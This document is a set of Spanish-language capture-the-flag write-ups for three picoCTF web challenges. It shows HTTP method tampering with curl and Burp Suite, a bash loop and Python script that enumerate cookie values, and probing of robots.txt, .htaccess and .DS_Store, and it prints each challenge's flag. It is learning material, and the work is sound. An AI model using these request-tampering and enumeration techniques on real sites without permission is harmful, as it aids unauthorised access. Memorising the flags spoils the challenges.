
# GET aHEAD

ind the flag being held on this server to get ahead of the competition [http://mercury.picoctf.net:21939/](http://mercury.picoctf.net:21939/)
Maybe you have more than 2 choices
Check out tools like Burpsuite to modify your requests and look at the responses

## Desde navegador

1. Ingresamos a la página
2. Inspeccionar
3. Network
4. Resend
5. Modificamos las solicitudes para que sean HEAD
6. Reenviamos la solicitud
7. Obtenemos la bandera en la respuesta 
```
picoCTF{r3j3ct_th3_du4l1ty_6ef27873}
```


## Desde consola

1. Copiamos el link
2. Ingresamos a la consola
3. Usamos el comando. Con el GET se pinta el fondo de la página de color rojo
```html
curl -X GET http://mercury.picoctf.net:21939/

output: 
...
<!doctype html>
<html>
<head>
    <title>Red</title>
    <link rel="stylesheet" type="text/css" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
        <style>body {background-color: red;}</style>
</head>
...
```
4. Usamos el comando. Con el POST se pinta el fondo de la página de color azul
```html
curl -X POST http://mercury.picoctf.net:21939/

output: 
...
<!doctype html>
<html>
<head>
    <title>Blue</title>
    <link rel="stylesheet" type="text/css" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
        <style>body {background-color: blue;}</style>
</head>
...
```
5. Usamos el método HEAD para obtener la bandera
```
curl -I HEAD http://mercury.picoctf.net:21939/


output:
curl: (6) Could not resolve host: HEAD
HTTP/1.1 200 OK
flag: picoCTF{r3j3ct_th3_du4l1ty_6ef27873}
Content-type: text/html; charset=UTF-8
```


## Usando Proxys

1. Abrimos la herramienta burpsuite
2. Creamos un proyecto temporal
3. Start Burp
4. Proxy
5. Proxy settings
6. Buscamos qué IP y puerto hay que configurar en el navegador para usar el proxy
7. Configuración de red del navegador
8. Hay dos formas de configurar el proxy
	- Manualmente
		1. Copiar la IP del proxy en burp
		2. Pegarla la IP en la configuración del navegador
9. Intercept
10. Encendemos la intercepción
11. Hacemos una solicitud
12. Manualmente modificamos el tipo para que sea HEAD
13. Forward
14. HTTP History
15. Seleccionamos la petición que acabamos de hacer
16. Buscamos la bandera en la respuesta


**Fuentes:**

- [Video explicación](https://www.youtube.com/watch?v=oiZk0tIkR48)
- [http methods](https://www.youtube.com/redirect?event=video_description&redir_token=QUFFLUhqbUFKODRsWUpEd29vQXpWV0FjTkYtQ3Jvam1wUXxBQ3Jtc0ttdnpKUzI1X1dVcEI3ZVFWT0pjZ2lURUlNTGFoWUVPLUZ1YXp3S2cwM1ZFbWVnVTNpY0UySTVSc29mMnNJUklyUmZHd3RfWGZYWi16dUNKWjNyTzdibDRRd3pqaXRNWi1UTk1KZ3lfdldhX0hVRVdmZw&q=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FHTTP%2FMethods&v=oiZk0tIkR48)
- [web proxy](https://www.youtube.com/redirect?event=video_description&redir_token=QUFFLUhqa2s5cHJ1bHhyWHIwUHlwU3BTTjhpNEVTWXRtQXxBQ3Jtc0ttZDZQekhQZ1RWQ3VNVlk5dnZBdUtKS0Q1RmZ2cGRYemxraXp0YUVGVVVXMUxiR3RLS3NZT2EyVlc2aG5aeFNPeFVuU2R4cktwZmRuZFljNzVHTlJvaU8zajNNTVp3VDhCaE9oV1EwbldSVlFoMU1fSQ&q=https%3A%2F%2Flearn.onemonth.com%2Fweb-hacking-tools-proxies%2F&v=oiZk0tIkR48)
- [foxyproxy](https://www.youtube.com/redirect?event=video_description&redir_token=QUFFLUhqbHpjd3dIVko1N19DMENsRXpQVUpYQXRqd3dQUXxBQ3Jtc0tsQTl5TjM0WVdwYmdiNVVxLU9ubmowR1RvZEs4bkNtYkxJeEZSS0pKcl9acDY1TUZpVVhFbFI5Sjd6TzFJbmdhZXJuVnMtc1FhaExyWDJ1UERNdXA2a1NQQTVnRmNCck1YWE54TUJnUmpyR01EVEd2Zw&q=https%3A%2F%2Faddons.mozilla.org%2Fen-US%2Ffirefox%2Faddon%2Ffoxyproxy-standard&v=oiZk0tIkR48)


# Cookies

Who doesn't love cookies? Try to figure out the best one. http://mercury.picoctf.net:64944/


## Por consola

1. Ingresamos a la página
2. Cookie - Editor
3. Modificamos el valor de name. Si ingresamos un dato no valido, se genera una cookie con valor de -1. Si ingresamos un dato valido, se genera una cookie con valor de 0, dependiendo del valor de la cookie, se muestras diferentes frames en la página. Este proceso de puede automatizar
4. Validamos nuestra entrada con un dato valido o esperado
5. Abrir consola
6. Ingresar comando y modificar al valor de name en la cookie
	```
	curl http://mercury.picoctf.net:64944/check -H "Cookie: name=0"
	```
7. Usamos un for
	```
	for i in {0..20}; do curl -s http://mercury.picoctf.net:64944/check -H "Cookie: name=$i"; done | grep -oE "picoCTF{.*?}"
	```
8. Encontramos la bandera
 ```
picoCTF{3v3ry1_l0v3s_c00k135_cc9110ba}
```



## Por burpsuite



## Exploit en Python

1. Abrimos consola en Python
	```
	nano exp.py
	```
2. Escribir programa
```python
import requests

url = "http://mercury.picoctf.net:64944/check"

for i in range(21):
        cookies = {'name':'{}'.format(i)}
        r = requests.get(url,cookies=cookies)
        if 'picoCTF' in r.text:
                print(r.text)
```
3. Ejecutamos el programa
	```
	python epx.py
	```
4. Encontramos la bandera
```html
output:
<!DOCTYPE html>
<html lang="en">

<head>
    <title>Cookies</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation"><a href="/reset" class="btn btn-link pull-right">Home</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Cookies</h3>
        </div>

        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_cc9110ba}</code></p>
        </div>


        <footer class="footer">
            <p>&copy; PicoCTF</p>
        </footer>

    </div>
</body>

</html>
```

```html
<p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_cc9110ba}</code></p>
```

5. Para obtener de manera limpia la bandera
	```python
	import requests
	import re
	
	url = "http://mercury.picoctf.net:64944/check"
	
	for i in range(21):
	        cookies = {'name':'{}'.format(i)}
	        r = requests.get(url,cookies=cookies)
	        if 'picoCTF' in r.text:
	                flag = re.findall('picoCTF{.*?}', r.text)[0]
	                print(flag)
	```

```
output:
picoCTF{3v3ry1_l0v3s_c00k135_cc9110ba}
```


**Fuentes:**
- [Video explicación](https://www.youtube.com/watch?v=LseQ-XWCXVo&t=184s)
- [python requests](https://www.youtube.com/redirect?event=video_description&redir_token=QUFFLUhqbkpLcXdKa3RuYjlvYVZtZUpsMEpVaUpLZmYtd3xBQ3Jtc0tuWDFpU0pDajJHRkpJM2t2U3A5ZW8wTHlGRjZSOHA1RnkzRmo0YlF1SGR0X2FfTVNyLTZyTnJUUXBtOGsyendDczJQcG5PdkRfSEUwWlhZTnFtdmwxNTdodDdBWXFxM2JUcTQyQ3NkRks2MGdFTjZrcw&q=https%3A%2F%2Fwww.w3schools.com%2Fpython%2Fmodule_requests.asp&v=LseQ-XWCXVo)


# Scavenger Hunt

There is some interesting information hidden around this site [http://mercury.picoctf.net:39698/](http://mercury.picoctf.net:39698/). Can you find it?
You should have enough hints to find the files, don't run a brute forcer.

1. Ingresamos a la página
2. Revisamos el código fuente
3. Encontramos la primera parte de la bandera
```html
<!doctype html>
<html>
  <head>
    <title>Scavenger Hunt</title>
    <link href="[https://fonts.googleapis.com/css?family=Open+Sans|Roboto](view-source:https://fonts.googleapis.com/css?family=Open+Sans|Roboto)" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="[mycss.css](view-source:http://mercury.picoctf.net:39698/mycss.css)">
    <script type="application/javascript" src="[myjs.js](view-source:http://mercury.picoctf.net:39698/myjs.js)"></script>
  </head>

  <body>
    <div class="container">
      <header>
		<h1>Just some boring HTML</h1>
      </header>

      <button class="tablink" onclick="openTab('tabintro', this, '#222')" id="defaultOpen">How</button>
      <button class="tablink" onclick="openTab('tababout', this, '#222')">What</button>

      <div id="tabintro" class="tabcontent">
		<h3>How</h3>
		<p>How do you like my website?</p>
      </div>

      <div id="tababout" class="tabcontent">
		<h3>What</h3>
		<p>I used these to make this site: <br/>
		  HTML <br/>
		  CSS <br/>
		  JS (JavaScript)
		</p>
	<!-- Here's the first part of the flag: picoCTF{t -->
      </div>

    </div>

  </body>
</html>
```
4. Encontramos la segunda parte
```css
div.container {
    width: 100%;
}

header {
    background-color: black;
    padding: 1em;
    color: white;
    clear: left;
    text-align: center;
}

body {
    font-family: Roboto;
}

h1 {
    color: white;
}

p {
    font-family: "Open Sans";
}

.tablink {
    background-color: #555;
    color: white;
    float: left;
    border: none;
    outline: none;
    cursor: pointer;
    padding: 14px 16px;
    font-size: 17px;
    width: 50%;
}

.tablink:hover {
    background-color: #777;
}

.tabcontent {
    color: #111;
    display: none;
    padding: 50px;
    text-align: center;
}

#tabintro { background-color: #ccc; }
#tababout { background-color: #ccc; }

/* CSS makes the page look nice, and yes, it also has part of the flag. Here's part 2: h4ts_4_l0 */
```
5. Al revisar la hoja de javascript encontramos una pista
```js
function openTab(tabName,elmnt,color) {
    var i, tabcontent, tablinks;
    tabcontent = document.getElementsByClassName("tabcontent");
    for (i = 0; i < tabcontent.length; i++) {
	tabcontent[i].style.display = "none";
    }
    tablinks = document.getElementsByClassName("tablink");
    for (i = 0; i < tablinks.length; i++) {
	tablinks[i].style.backgroundColor = "";
    }
    document.getElementById(tabName).style.display = "block";
    if(elmnt.style != null) {
	elmnt.style.backgroundColor = color;
    }
}

window.onload = function() {
    openTab('tabintro', this, '#222');
}

/* How can I keep Google from indexing my website? */
```
6. Buscamos en el archivo robots
```
http://mercury.picoctf.net:39698/robots.txt

output: 
User-agent: *
Disallow: /index.html
# Part 3: t_0f_pl4c
# I think this is an apache server... can you Access the next flag? 
```
7. Buscamos en el archivo .htaccess
```
http://mercury.picoctf.net:39698/.htaccess

output:
# Part 4: 3s_2_lO0k
# I love making websites on my Mac, I can Store a lot of information there.
```
8. Buscamos en el archivo .DS_Store
```
http://mercury.picoctf.net:39698/.DS_Store

output: 
Congrats! You completed the scavenger hunt. Part 5: _fa04427c}
```
9. Obtenemos la bandera
```
picoCTF{th4ts_4_l0t_0f_pl4c3s_2_lO0k_fa04427c}
```


**Fuentes:**
- [Video explicación]
- [.htaccess Apache Server](https://www.youtube.com/redirect?event=video_description&redir_token=QUFFLUhqbVZrVlBsaElBaHdXOW5odDlsR1VVQWdrMFJ5Z3xBQ3Jtc0tuckVjVFdzQ1FKbFhYR0dZVUk3LU1aVkZwZVBsVlhNMkFqbVhKWHhsTE4zX2s2S3g1S05XVDNFLThHNEFUTEkwTkN5bVpZbDhLRVJYeU9kYjVpRTFjRE1DNERPSkVPei1ZZEUwU3FncDVwWFk4eHc4TQ&q=https%3A%2F%2Fhttpd.apache.org%2Fdocs%2F2.4%2Fen%2Fhowto%2Fhtaccess.html&v=E2gN3AGHirc)
- [.DS_Store mac file](https://www.youtube.com/redirect?event=video_description&redir_token=QUFFLUhqa3o0eHhQeDczN05nNEhXU0ZCaXhuSERZRnlSUXxBQ3Jtc0trS2J0VDdVWk85cU1IU1BZREFRVVlWNDRYMHZxS0MzQ3c0VkRzMzVTUEFkSGFZQ1hkdkRrWDBBZVNFU3ZqX2piWGhkZ1JhS1dneEtDaTJVdmpQUDZFTTl1MG9NYzVQSzVlWmJFRk5rS3otdk5kZ05nbw&q=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2F.DS_Store&v=E2gN3AGHirc)